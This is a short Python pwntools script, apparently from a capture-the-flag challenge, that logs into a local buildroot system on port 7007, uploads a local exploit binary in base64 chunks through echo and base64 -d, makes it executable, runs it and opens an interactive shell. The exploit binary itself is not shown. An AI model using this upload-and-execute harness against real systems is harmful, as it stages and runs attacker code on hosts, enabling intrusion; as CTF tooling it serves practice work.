from pwn import *

import os

r = connect("127.0.0.1",7007)

r.recvuntil(b"buildroot login")
r.sendline(b"pwn")

def send_shell(cmd):
	r.sendline(cmd)
	r.recvline()
	return r.recvuntil(b"$", drop=True).replace(b'\r',b'').decode(errors="ignore")

from base64 import b64encode

def chunks(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]

with open("pwn", "rb") as f:
	data = f.read()

	chunk_size = 256
	send_shell("touch pwn")
	for (i, chunk) in enumerate(chunks(data, chunk_size)):
		if i % 8 == 0:
			print(f"{i * chunk_size}/{len(data)}")

		send_shell(f"echo {b64encode(chunk).decode()} | base64 -d >> pwn")


print(send_shell(b"chmod +x ./pwn"))
print(send_shell(b"./pwn"))

r.interactive()